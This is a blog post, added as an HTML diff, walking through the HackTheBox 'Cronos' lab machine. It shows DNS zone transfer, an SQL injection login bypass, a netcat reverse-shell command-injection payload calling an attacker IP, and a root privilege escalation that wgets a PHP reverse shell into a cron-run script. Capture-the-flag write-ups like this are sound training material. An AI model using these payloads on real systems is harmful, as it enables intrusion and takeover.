@@ -1,0 +1,435 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <title>Acruxlare | HackTheBox - Cronos</title>
+  <meta name="description" content="Walkthrough of Cronos box on Hackthebox.">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <meta property="og:title" content="HackTheBox - Cronos">
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="https://fumenoid.github.io/posts/hackthebox-cronos">
+  <meta property="og:description" content="Walkthrough of Cronos box on Hackthebox.">
+  <meta property="og:site_name" content="Acruxlare">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:url" content="https://fumenoid.github.io/posts/hackthebox-cronos">
+  <meta name="twitter:title" content="HackTheBox - Cronos">
+  <meta name="twitter:description" content="Walkthrough of Cronos box on Hackthebox.">
+
+  
+    
+      <meta property="og:image" content="https://fumenoid.github.io/assets/documentation/cronosthumb-c917a7d2e63d83dc39626915e092a1aba78dbbbec07f8a4c7e81680ccfce5e0a.png">
+      <meta property="og:image:height" content="286">
+      <meta property="og:image:width" content="507">
+      <meta name="twitter:image" content="https://fumenoid.github.io/assets/documentation/cronosthumb-c917a7d2e63d83dc39626915e092a1aba78dbbbec07f8a4c7e81680ccfce5e0a.png">
+      <meta name="twitter:card" content="summary_large_image">
+    
+  
+
+  <link href="https://fumenoid.github.io/feed.xml" type="application/rss+xml" rel="alternate" title="Acruxlare Last 10 blog posts" />
+
+  
+
+  
+
+    
+      <link rel="icon" type="image/x-icon" href="/assets/favicon-dark-f46876861f8611b1be1e40dbc82954f6ce18e041809dce43ba85794a93ef72e2.ico">
+      <link rel="apple-touch-icon" href="/assets/apple-touch-icon-dark-d161409442b7e523089f24d08d0a55951549ece7504207c376d53b020713494d.png">
+      <link rel="stylesheet" type="text/css" href="/assets/dark-831218bc9e41aef39ee6a0bae4501195bccafcc13101ae2b9cd20493a6ec04c0.css">
+    
+
+  
+
+</head>
+
+<body>
+  <main>
+    <div class="grid grid-centered">
+      <div class="grid-cell">
+        <nav class="header-nav scrollappear">
+  <a href="/" class="header-logo" title="Acruxlare">Acruxlare</a>
+  <ul class="header-links">
+    
+      <li>
+        <a href="/about" title="About me">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-about">
+  <use href="/assets/about-ecf154b571ab8034ae00aeed91a3b7ad68db80b46d958753ad6216c919486e88.svg#icon-about" xlink:href="/assets/about-ecf154b571ab8034ae00aeed91a3b7ad68db80b46d958753ad6216c919486e88.svg#icon-about"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+      <li>
+        <a href="https://twitter.com/fumenoid" rel="noreferrer noopener" target="_blank" title="Twitter">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-twitter">
+  <use href="/assets/twitter-8842c33965263ad1b03a978406826677a668f94125d5837e70ab83f24b3213a7.svg#icon-twitter" xlink:href="/assets/twitter-8842c33965263ad1b03a978406826677a668f94125d5837e70ab83f24b3213a7.svg#icon-twitter"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+      <li>
+        <a href="https://github.com/fumenoid" rel="noreferrer noopener" target="_blank" title="GitHub">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-github">
+  <use href="/assets/github-094f81040819f34343ee6ffff0980f17e2807b08b595eaaf66ae3554934fd78d.svg#icon-github" xlink:href="/assets/github-094f81040819f34343ee6ffff0980f17e2807b08b595eaaf66ae3554934fd78d.svg#icon-github"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+      <li>
+        <a href="mailto:fumenoid@gmail.com" title="Email">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-email">
+  <use href="/assets/email-782473193bf750036fdb90e8daa075508a20509d01854c09f3237c144a3f0601.svg#icon-email" xlink:href="/assets/email-782473193bf750036fdb90e8daa075508a20509d01854c09f3237c144a3f0601.svg#icon-email"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+  </ul>
+</nav>
+
+
+  <ul class="header-tags scrollappear">
+    
+    
+      
+        <li><a href="/tag/forensics">Forensics</a></li>
+    
+      
+        <li><a href="/tag/hackthebox">Hackthebox</a></li>
+    
+      
+        <li><a href="/tag/programming">Programming</a></li>
+    
+      
+        <li><a href="/tag/sorcery">Sorcery</a></li>
+    
+      
+        <li><a href="/tag/tryhackme">Tryhackme</a></li>
+    
+  </ul>
+
+
+        <article class="article scrollappear">
+          <header class="article-header">
+            <h1>HackTheBox - Cronos</h1>
+            <p>Walkthrough of Cronos box on Hackthebox.</p>
+            <div class="article-list-footer">
+  <span class="article-list-date">
+    November 29, 2020
+  </span>
+  <span class="article-list-divider">-</span>
+  <span class="article-list-minutes">
+    
+    
+      6 minute read
+    
+  </span>
+  <span class="article-list-divider">-</span>
+  <div class="article-list-tags">
+    
+      
+      <a href="/tag/hackthebox" title="See all posts with tag 'hackthebox'">hackthebox</a>
+    
+  </div>
+</div>
+          </header>
+
+          <div class="article-content">
+            <p><a href="/assets/documentation/cronos-99e5eb1efbe0ef85a05120015c59f04eaf8eed783ba33fc72943477c72c24dd2.webp">
+  <img src="/assets/documentation/cronos-99e5eb1efbe0ef85a05120015c59f04eaf8eed783ba33fc72943477c72c24dd2.webp" alt="HTB Cronos" class="zooming" data-rjs="/assets/documentation/cronos-99e5eb1efbe0ef85a05120015c59f04eaf8eed783ba33fc72943477c72c24dd2.webp" data-zooming-width="800" data-zooming-height="505">
+</a></p>
+
+<h2 id="htb---cronos">HTB - Cronos</h2>
+
+<p>IP - 10.10.10.13</p>
+
+<h3 id="overview">Overview</h3>
+
+<p>This box was a medium level linux box on HTB created by <a href="https://www.hackthebox.eu/home/users/profile/1">ch4p</a>, it started with emunerating dns to find vhost <code class="highlighter-rouge">cronos.htb</code> and <code class="highlighter-rouge">admin.cronos.htb</code>, then the bypassing login page on <code class="highlighter-rouge">admin.cronos.htb</code> by sqli. After that we use command injection on ping utility to get a reverse shell as <code class="highlighter-rouge">www-data</code>. We privesc to root from www-data by modifying a script <code class="highlighter-rouge">artisan</code> that is running every minute by a cronjob as root.</p>
+
+<h3 id="enumeration">Enumeration</h3>
+
+<p>As always let’s start off with nmap script nmap -sC for default scripts <del>Alright, if it isn’t obvious yet I am a IPPSEC fanboi.</del> Aight, firing up nmap to scan all open ports on the box.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-o</span> nmap/initial 10.10.10.13</code></pre></figure>
+
+<p>And here is our nmap result</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Hacking/Pentest/HTB/Boxes/Cronos]
+└──╼ <span class="nv">$sudo</span> nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-o</span> nmap/initial 10.10.10.13
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>fumenoid: 
+Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-11-29 13:40 IST
+Nmap scan report <span class="k">for </span>10.10.10.13
+Host is up <span class="o">(</span>0.11s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 997 filtered ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 <span class="o">(</span>ED25519<span class="o">)</span>
+53/tcp open  domain  ISC BIND 9.10.3-P4 <span class="o">(</span>Ubuntu Linux<span class="o">)</span>
+| dns-nsid: 
+|_  bind.version: 9.10.3-P4-Ubuntu
+80/tcp open  http    Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Apache2 Ubuntu Default Page: It works
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>25.50 seconds</code></pre></figure>
+
+<p>Aight let’s start enumerating the webserver first, as well as run an all port scan.</p>
+
+<h4 id="enumerating-the-web-server">Enumerating the web server</h4>
+
+<p><a href="/assets/documentation/cronosdefault-cc98e20adcddefaebfcd90ea318847493e1fbe02474ef3ee2f8dd565d3ab75d3.webp">
+  <img src="/assets/documentation/cronosdefault-cc98e20adcddefaebfcd90ea318847493e1fbe02474ef3ee2f8dd565d3ab75d3.webp" alt="HTB Cronos" class="zooming" data-rjs="/assets/documentation/cronosdefault-cc98e20adcddefaebfcd90ea318847493e1fbe02474ef3ee2f8dd565d3ab75d3.webp" data-zooming-width="1366" data-zooming-height="716">
+</a></p>
+
+<p>Seems like a default Apache page, running gobuster for directory bruteforcing but it found nothing D:</p>
+
+<h4 id="enumerating-the-dns-server">Enumerating the DNS server</h4>
+
+<p>First we use nslookup to find the base domain that is <code class="highlighter-rouge">cronos.htb</code>, here we use <code class="highlighter-rouge">10.10.10.13</code> as our dns server by <code class="highlighter-rouge">-server 10.10.10.13</code> and enumerate <code class="highlighter-rouge">10.10.10.13</code>.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Hacking/Pentest/HTB/Boxes/Cronos]
+└──╼ <span class="nv">$nslookup</span> <span class="nt">-query</span><span class="o">=</span>ANY <span class="nt">-server</span> 10.10.10.13 <span class="nt">-host</span> 10.10.10.13
+<span class="k">***</span> Invalid option: server
+<span class="k">***</span> Invalid option: host
+Server:		10.10.10.13
+Address:	10.10.10.13#53
+
+13.10.10.10.in-addr.arpa	name <span class="o">=</span> ns1.cronos.htb.</code></pre></figure>
+
+<p>Now we can use zone transfer to enumerate more.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Hacking/Pentest/HTB/Boxes/Cronos]
+└──╼ <span class="nv">$dig</span> axfr @10.10.10.13 cronos.htb
+
+<span class="p">;</span> &lt;&lt;<span class="o">&gt;&gt;</span> DiG 9.16.2-Debian &lt;&lt;<span class="o">&gt;&gt;</span> axfr @10.10.10.13 cronos.htb
+<span class="p">;</span> <span class="o">(</span>1 server found<span class="o">)</span>
+<span class="p">;;</span> global options: +cmd
+cronos.htb.		604800	IN	SOA	cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
+cronos.htb.		604800	IN	NS	ns1.cronos.htb.
+cronos.htb.		604800	IN	A	10.10.10.13
+admin.cronos.htb.	604800	IN	A	10.10.10.13
+ns1.cronos.htb.		604800	IN	A	10.10.10.13
+www.cronos.htb.		604800	IN	A	10.10.10.13
+cronos.htb.		604800	IN	SOA	cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
+<span class="p">;;</span> Query <span class="nb">time</span>: 92 msec
+<span class="p">;;</span> SERVER: 10.10.10.13#53<span class="o">(</span>10.10.10.13<span class="o">)</span>
+<span class="p">;;</span> WHEN: Sun Nov 29 14:35:44 IST 2020
+<span class="p">;;</span> XFR size: 7 records <span class="o">(</span>messages 1, bytes 203<span class="o">)</span></code></pre></figure>
+
+<p>And we discovered <code class="highlighter-rouge">admin.cronos.htb</code>, <code class="highlighter-rouge">cronos.htb</code> and <code class="highlighter-rouge">ns1.cronos.htb</code>, let’s add them to <code class="highlighter-rouge">/etc/hosts</code> and now we can start enumerating these subdomains.</p>
+
+<h4 id="enumerating-the-cronoshtb">Enumerating the cronos.htb</h4>
+
+<p><a href="/assets/documentation/cronoslaravel-e7ef1bf5522c0779855208a23a99c8ca249e578e149abadb5095032e07ea62d8.webp">
+  <img src="/assets/documentation/cronoslaravel-e7ef1bf5522c0779855208a23a99c8ca249e578e149abadb5095032e07ea62d8.webp" alt="HTB Cronos" class="zooming" data-rjs="/assets/documentation/cronoslaravel-e7ef1bf5522c0779855208a23a99c8ca249e578e149abadb5095032e07ea62d8.webp" data-zooming-width="1366" data-zooming-height="715">
+</a></p>
+
+<p>A php website build using laravel. Running gobuster again but wasn’t able to find anything useful again, then I searched for <code class="highlighter-rouge">laravel</code> exploits using searchsploit.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Hacking/Pentest/HTB/Boxes/Cronos]
+└──╼ <span class="nv">$searchsploit</span> laravel
+<span class="nt">-----------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+ Exploit Title                                                                                       |  Path
+<span class="nt">-----------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+Laravel - <span class="s1">'Hash::make()'</span> Password Truncation Security                                                | multiple/remote/39318.txt
+Laravel Log Viewer &lt; 0.13.0 - Local File Download                                                    | php/webapps/44343.py
+PHP Laravel Framework 5.5.40 / 5.6.x &lt; 5.6.30 - token Unserialize Remote Command Execution <span class="o">(</span>Metasplo | linux/remote/47129.rb
+UniSharp Laravel File Manager 2.0.0 - Arbitrary File Read                                            | php/webapps/48166.txt
+UniSharp Laravel File Manager 2.0.0-alpha7 - Arbitrary File Upload                                   | php/webapps/46389.py
+<span class="nt">-----------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span></code></pre></figure>
+
+<p>Exploit 1,2,4,5 can easily be discarded and seems like for exploit 3 we need <code class="highlighter-rouge">App_token</code> but we don’t have <code class="highlighter-rouge">lfi</code> or any other vuln that can be used to dump it. So shifting my focus to <code class="highlighter-rouge">admin.cronos.htb</code>.</p>
+
+<h4 id="enumerating-the-admincronoshtb">Enumerating the admin.cronos.htb</h4>
+
+<p>A login pannel, I tried default creds like <code class="highlighter-rouge">admin:admin</code> &amp; <code class="highlighter-rouge">admin:password</code> but they didn’t worked and from response it seems we can’t even enumerate users.</p>
+
+<p><a href="/assets/documentation/cronosadmin-6389a6fad10b8facfc859e3d1e5a513eafcdb0f15b4b729e9ad1d869c99be11e.webp">
+  <img src="/assets/documentation/cronosadmin-6389a6fad10b8facfc859e3d1e5a513eafcdb0f15b4b729e9ad1d869c99be11e.webp" alt="HTB Cronos" class="zooming" data-rjs="/assets/documentation/cronosadmin-6389a6fad10b8facfc859e3d1e5a513eafcdb0f15b4b729e9ad1d869c99be11e.webp" data-zooming-width="1366" data-zooming-height="714">
+</a></p>
+
+<h4 id="foothold">Foothold</h4>
+
+<p>Trying SQLi payloads on the admin login page on admin.cronos.htb, <code class="highlighter-rouge">' or 1=1 -- -</code> worked and we bypassed the login page, now we have access to <code class="highlighter-rouge">Net Tools</code>.</p>
+
+<p><a href="/assets/documentation/cronosnettools-89d3332c7f78b3023b8756bca0b616cd809d3733b56018825d1a2c1c8943217f.webp">
+  <img src="/assets/documentation/cronosnettools-89d3332c7f78b3023b8756bca0b616cd809d3733b56018825d1a2c1c8943217f.webp" alt="HTB Cronos" class="zooming" data-rjs="/assets/documentation/cronosnettools-89d3332c7f78b3023b8756bca0b616cd809d3733b56018825d1a2c1c8943217f.webp" data-zooming-width="1366" data-zooming-height="714">
+</a></p>
+
+<p>Discovering <code class="highlighter-rouge">command injection</code> in the <code class="highlighter-rouge">ping</code> utility.</p>
+
+<p><a href="/assets/documentation/cronoscommandi-980ebebdb01bd285efd7f1c9fcfbc5df0f2c01d924f68a8d7275826646f94d6d.webp">
+  <img src="/assets/documentation/cronoscommandi-980ebebdb01bd285efd7f1c9fcfbc5df0f2c01d924f68a8d7275826646f94d6d.webp" alt="HTB Cronos" class="zooming" data-rjs="/assets/documentation/cronoscommandi-980ebebdb01bd285efd7f1c9fcfbc5df0f2c01d924f68a8d7275826646f94d6d.webp" data-zooming-width="1366" data-zooming-height="716">
+</a></p>
+
+<h3 id="exploitation">Exploitation</h3>
+
+<p>Exploiting command injection vuln with this netcat reverse shell payload <code class="highlighter-rouge">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.3 9889 &gt;/tmp/f</code> from <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">pentestermonkey</a>.</p>
+
+<p><a href="/assets/documentation/cronoscommandirev-56aba839b48841cb891ecf3cd9fd5cb504e6e73e78407ed06ad4dfc5a1578af4.webp">
+  <img src="/assets/documentation/cronoscommandirev-56aba839b48841cb891ecf3cd9fd5cb504e6e73e78407ed06ad4dfc5a1578af4.webp" alt="HTB Cronos" class="zooming" data-rjs="/assets/documentation/cronoscommandirev-56aba839b48841cb891ecf3cd9fd5cb504e6e73e78407ed06ad4dfc5a1578af4.webp" data-zooming-width="1366" data-zooming-height="715">
+</a></p>
+
+<p>And looking at our <code class="highlighter-rouge">netcat</code> listner, yep we got a shell as <code class="highlighter-rouge">www-data</code>.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Hacking/Pentest/HTB/Boxes/Cronos]
+└──╼ <span class="nv">$rlwrap</span> nc <span class="nt">-lvnp</span> 9889
+listening on <span class="o">[</span>any] 9889 ...
+connect to <span class="o">[</span>10.10.14.3] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.13] 39038
+/bin/sh: 0: cant access <span class="nb">tty</span><span class="p">;</span> job control turned off
+<span class="nv">$ </span><span class="nb">whoami
+</span>www-data
+<span class="nv">$ </span></code></pre></figure>
+
+<h3 id="getting-user">Getting User</h3>
+
+<p>Getting the user flag is easy as <code class="highlighter-rouge">www-data</code> has perms to read the flag.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">www-data@cronos:/home/noulis<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> user.txt
+<span class="nb">ls</span> <span class="nt">-la</span> user.txt
+<span class="nt">-r--r--r--</span> 1 noulis noulis 33 Mar 22  2017 user.txt
+www-data@cronos:/home/noulis<span class="nv">$ </span><span class="nb">wc</span> <span class="nt">-c</span> user.txt
+<span class="nb">wc</span> <span class="nt">-c</span> user.txt
+33 user.txt
+www-data@cronos:/home/noulis<span class="err">$</span></code></pre></figure>
+
+<h3 id="rooting-the-box">Rooting the box</h3>
+
+<p>In post enumeration running <code class="highlighter-rouge">linpeas.sh</code> from <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite">Privilege Escalation Awesome Scripts SUITE</a> discovers a cronjob running as root.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="k">*</span> <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> <span class="k">*</span>	root	php /var/www/laravel/artisan schedule:run <span class="o">&gt;&gt;</span> /dev/null 2&gt;&amp;1</code></pre></figure>
+
+<p><code class="highlighter-rouge">www-data</code> had read and write perm on <code class="highlighter-rouge">artisan</code> script, so I created a php reverse shell in my host system using this <a href="https://github.com/pentestmonkey/php-reverse-shell">pentester monkey php reverse shell</a> and then replaced it with the <code class="highlighter-rouge">artisan</code> script on the box.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">www-data@cronos:/var/www/laravel<span class="nv">$ </span>wget http://10.10.14.3:8000/shell.php
+wget http://10.10.14.3:8000/shell.php
+<span class="nt">--2020-11-29</span> 13:14:26--  http://10.10.14.3:8000/shell.php
+Connecting to 10.10.14.3:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3479 <span class="o">(</span>3.4K<span class="o">)</span> <span class="o">[</span>application/octet-stream]
+Saving to: <span class="s1">'shell.php'</span>
+
+shell.php           100%[<span class="o">===================&gt;]</span>   3.40K  <span class="nt">--</span>.-KB/s    <span class="k">in </span>0s      
+
+2020-11-29 13:14:26 <span class="o">(</span>9.64 MB/s<span class="o">)</span> - <span class="s1">'shell.php'</span> saved <span class="o">[</span>3479/3479]
+
+www-data@cronos:/var/www/laravel<span class="nv">$ </span><span class="nb">ls
+ls
+</span>CHANGELOG.md   composer.lock  phpunit.xml  server.php  webpack.mix.js
+app	       composer.phar  public	   shell.php
+artisan        config	      readme.md    storage
+bootstrap      database       resources    tests
+composer.json  package.json   routes	   vendor
+www-data@cronos:/var/www/laravel<span class="nv">$ </span><span class="nb">rm </span>artisan<span class="p">;</span> <span class="nb">mv </span>shell.php artisan
+<span class="nb">rm </span>artisan<span class="p">;</span> <span class="nb">mv </span>shell.php artisan
+www-data@cronos:/var/www/laravel<span class="nv">$ </span><span class="nb">ls
+ls
+</span>CHANGELOG.md  composer.json  database	   readme.md   storage
+app	      composer.lock  package.json  resources   tests
+artisan       composer.phar  phpunit.xml   routes      vendor
+bootstrap     config	     public	   server.php  webpack.mix.js</code></pre></figure>
+
+<p>Checking our <code class="highlighter-rouge">netcat</code> listner and we get our root revshell.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Hacking/Pentest/HTB/Boxes/Cronos]
+└──╼ <span class="nv">$rlwrap</span> nc <span class="nt">-lvnp</span> 9001
+listening on <span class="o">[</span>any] 9001 ...
+connect to <span class="o">[</span>10.10.14.3] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.13] 57370
+Linux cronos 4.4.0-72-generic <span class="c">#93-Ubuntu SMP Fri Mar 31 14:07:41 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux</span>
+ 13:15:01 up  3:04,  0 <span class="nb">users</span>,  load average: 0.00, 0.02, 0.03
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+/bin/sh: 0: cant access <span class="nb">tty</span><span class="p">;</span> job control turned off
+<span class="c"># whoami</span>
+root
+<span class="c"># cd /root</span>
+<span class="c"># ls</span>
+root.txt
+<span class="c"># wc -c root.txt</span>
+33 root.txt
+<span class="c"># </span></code></pre></figure>
+
+<h6 id="hope-you-learned-something-new-if-you-face-any-issues--have-any-query-feel-free-to-contact-me-on-social-media">Hope you learned something new, if you face any issues / have any query, feel free to contact me on social media.</h6>
+
+          </div>
+          <div class="article-share">
+            
+            
+            <a href="https://twitter.com/intent/tweet?url=https://fumenoid.github.io/posts/hackthebox-cronos&amp;via=fumenoid&amp;text=HackTheBox%20-%20Cronos%20:%20Walkthrough%20of%20Cronos%20box%20on%20Hackthebox." title="Share on Twitter" rel="noreferrer noopener" target="_blank">
+              <svg viewbox="0 0 512 512"><path d="M492 109.5c-17.4 7.7-36 12.9-55.6 15.3 20-12 35.4-31 42.6-53.6 -18.7 11.1-39.4 19.2-61.5 23.5C399.8 75.8 374.6 64 346.8 64c-53.5 0-96.8 43.4-96.8 96.9 0 7.6 0.8 15 2.5 22.1 -80.5-4-151.9-42.6-199.6-101.3 -8.3 14.3-13.1 31-13.1 48.7 0 33.6 17.2 63.3 43.2 80.7C67 210.7 52 206.3 39 199c0 0.4 0 0.8 0 1.2 0 47 33.4 86.1 77.7 95 -8.1 2.2-16.7 3.4-25.5 3.4 -6.2 0-12.3-0.6-18.2-1.8 12.3 38.5 48.1 66.5 90.5 67.3 -33.1 26-74.9 41.5-120.3 41.5 -7.8 0-15.5-0.5-23.1-1.4C62.8 432 113.7 448 168.3 448 346.6 448 444 300.3 444 172.2c0-4.2-0.1-8.4-0.3-12.5C462.6 146 479 129 492 109.5z"></path></svg>
+            </a>
+            <a href="https://www.facebook.com/sharer/sharer.php?u=https://fumenoid.github.io/posts/hackthebox-cronos" title="Share on Facebook" rel="noreferrer noopener" target="_blank">
+              <svg viewbox="0 0 512 512"><path d="M288 192v-38.1c0-17.2 3.8-25.9 30.5-25.9H352V64h-55.9c-68.5 0-91.1 31.4-91.1 85.3V192h-45v64h45v192h83V256h56.4l7.6-64H288z"></path></svg>
+            </a>
+          </div>
+
+          
+        </article>
+        <footer class="footer scrollappear">
+  <p>
+    Happy Hacking :D
+  </p>
+</footer>
+
+      </div>
+    </div>
+  </main>
+  
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-172959519-1"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'UA-172959519-1');
+  </script>
+
+
+<script src="/assets/vendor-130c9c254effc51f3283620bc635851da7b99c20901216948f11ba72ee13317f.js" type="text/javascript"></script>
+
+
+  <script src="/assets/webfonts-96493456d319d1bf419afdf8701552d4d486fee6afd304897d4fd81eb4e0cc0b.js" type="text/javascript"></script>
+
+
+
+  <script src="/assets/scrollappear-e2da8ea567e418637e31266cc5302126eaa79f62a2273739086358b589a89ee6.js" type="text/javascript"></script>
+
+
+<script src="/assets/application-cfde13ac81ddaf4351b2e739603e2baf688d0fcc9aba613fe62bbb1c7b037fb9.js" type="text/javascript"></script>
+
+
+</body>
+</html>
